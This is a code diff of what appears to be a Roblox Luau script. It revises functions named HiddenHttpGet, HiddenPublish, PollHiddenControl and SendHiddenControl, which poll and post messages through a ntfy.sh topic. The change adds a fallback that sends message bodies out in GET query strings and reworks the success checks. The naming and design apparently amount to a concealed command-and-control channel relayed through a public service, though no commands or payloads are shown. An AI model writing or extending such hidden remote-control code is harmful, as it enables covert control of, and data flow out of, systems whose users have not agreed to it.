@@ -880,12 +880,12 @@ local function ReadHiddenResponse(
 )
     if typeof(response)
         == "string" then
-        return response, 200
+        return response, 200, true
     end
 
     if typeof(response)
         ~= "table" then
-        return nil, 0
+        return nil, 0, false
     end
 
     local body =
@@ -900,7 +900,28 @@ local function ReadHiddenResponse(
             or 0
         ) or 0
 
-    return body, status
+    local successFlag =
+        response.Success
+
+    if successFlag == nil then
+        successFlag =
+            response.success
+    end
+
+    local success =
+        successFlag ~= false
+        and (
+            (
+                status >= 200
+                and status < 300
+            )
+            or (
+                status == 0
+                and successFlag == true
+            )
+        )
+
+    return body, status, success
 end
 
 local function HiddenHttpGet(
@@ -922,20 +943,14 @@ local function HiddenHttpGet(
             end)
 
         if ok then
-            local body, status =
+            local body, _, success =
                 ReadHiddenResponse(
                     response
                 )
 
-            if typeof(body)
-                == "string"
-            and (
-                status == 0
-                or (
-                    status >= 200
-                    and status < 300
-                )
-            ) then
+            if success
+            and typeof(body)
+                == "string" then
                 return body
             end
         end
@@ -967,21 +982,48 @@ local function HiddenHttpGet(
     return nil
 end
 
-local function HiddenHttpPost(
+local function HiddenPublish(
     body
 )
     body =
         tostring(body or "")
 
-    local url =
+    if body == "" then
+        return false
+    end
+
+    local getUrl =
         "https://ntfy.sh/"
         .. HIDDEN_CONTROL_TOPIC
+        .. "/publish?message="
+        .. HttpService:UrlEncode(
+            body
+        )
+        .. "&cache=yes&_="
+        .. tostring(
+            math.floor(
+                os.clock() * 1000
+            )
+        )
+
+    local getResponse =
+        HiddenHttpGet(
+            getUrl
+        )
+
+    if typeof(getResponse)
+        == "string"
+    and getResponse ~= "" then
+        return true
+    end
 
     if RequestFunction then
         local ok, response =
             pcall(function()
                 return RequestFunction({
-                    Url = url,
+                    Url =
+                        "https://ntfy.sh/"
+                        .. HIDDEN_CONTROL_TOPIC,
                     Method = "POST",
                     Headers = {
                         ["Content-Type"] =
@@ -994,29 +1036,18 @@ local function HiddenHttpPost(
             end)
 
         if ok then
-            local _, status =
+            local _, _, success =
                 ReadHiddenResponse(
                     response
                 )
 
-            if status == 0
-            or (
-                status >= 200
-                and status < 300
-            ) then
+            if success then
                 return true
             end
         end
     end
 
-    return pcall(function()
-        HttpService:PostAsync(
-            url,
-            body,
-            Enum.HttpContentType.TextPlain,
-            false
-        )
-    end)
+    return false
 end
 
 local function SendHiddenAck(
@@ -1050,7 +1081,7 @@ local function SendHiddenAck(
         })
 
     task.spawn(function()
-        HiddenHttpPost(ack)
+        HiddenPublish(ack)
     end)
 end
 
@@ -1267,7 +1298,7 @@ local function PollHiddenControl()
             UrlEncode(
                 HiddenLastID
             )
-        or "10s"
+        or "15s"
 
     local url =
         "https://ntfy.sh/"
@@ -1378,7 +1409,7 @@ local function SendHiddenControl(
 
     for _ = 1, 3 do
         local posted =
-            HiddenHttpPost(
+            HiddenPublish(
                 payload
             )
 
